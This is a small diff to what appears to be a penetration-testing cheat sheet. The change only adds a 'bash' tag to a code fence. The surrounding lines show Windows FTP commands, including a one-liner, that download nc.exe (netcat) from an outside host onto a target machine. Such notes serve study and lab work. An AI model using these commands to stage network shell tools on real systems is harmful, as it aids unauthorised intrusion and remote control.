@@ -223,7 +223,7 @@ echo get file.exe>>ftp-commands.txt
 echo bye>>ftp-commands.txt 
 ftp -s:ftp-commands.txt
 ```
-```
+```bash
 # Or just a one-liner
 (echo open 10.11.0.245&echo anonymous&echo whatever&echo binary&echo get nc.exe&echo bye) > ftp.txt & ftp -s:ftp.txt
 ```
